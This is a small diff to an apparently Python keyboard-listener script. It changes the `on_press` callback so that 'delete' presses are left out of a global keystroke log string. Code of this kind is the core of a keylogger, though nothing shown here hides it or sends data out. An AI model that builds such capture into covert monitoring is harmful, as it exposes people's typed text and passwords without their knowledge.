@@ -19,7 +19,9 @@ def on_press(key):
     global log
 
     key = fix_key(key)
-    log = log + " " + key
+    
+    if key != "delete":
+        log = log + " " + key
 
 def on_release(key):
     key = fix_key(key)
